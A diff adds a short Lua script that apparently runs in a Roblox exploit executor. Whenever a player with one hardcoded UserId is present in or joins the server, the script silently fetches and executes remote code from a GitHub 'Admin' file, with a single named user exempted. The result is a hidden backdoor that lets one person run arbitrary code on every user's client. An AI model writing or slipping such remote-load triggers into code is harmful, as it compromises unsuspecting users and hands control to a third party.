@@ -1,0 +1,32 @@
+
+
+getgenv().free = true
+
+
+if game.Players.LocalPlayer.Name == 'Kingsman_Kino' then
+  getgenv().free = false
+end
+
+local mod = {
+ 2209322072,
+ 
+  
+  
+}
+
+for l, c in pairs(game.Players:GetChildren()) do
+for i, v in pairs(mod) do
+if c.UserId == v and getgenv().free == true then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinozami/Admin/main/Admin"))()
+end
+end
+end
+game.Players.PlayerAdded:Connect(function(plr)
+for i, v in pairs(mod) do
+if plr.UserId == v and getgenv().free == true then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinozami/Admin/main/Admin"))()
+end
+end
+end)
+
+
